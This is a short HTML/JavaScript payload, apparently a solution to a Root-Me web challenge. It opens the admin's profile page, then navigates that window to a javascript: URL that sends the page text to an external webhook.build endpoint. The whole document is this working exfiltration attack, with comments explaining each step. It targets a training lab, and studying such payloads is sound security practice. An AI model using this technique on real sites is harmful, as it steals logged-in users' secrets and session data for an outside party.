<script>
  // 1. Open the admin's profile page. 
  // It will load the admin's secret because the admin is logged in.
  const adminWin = window.open('http://challenge01.root-me.org:58003/profile', 'victim');

  // 2. We wait for the page to load.
  setTimeout(() => {
    // 3. Since we can't READ the admin's window cross-origin, 
    // we use the 'location' property (which IS accessible) 
    // to navigate the admin's window to a javascript URL.
    // This executes the code INSIDE the admin's session.
    adminWin.location.href = "javascript:fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?secret=' + document.body.innerText)";
  }, 2000);
</script>
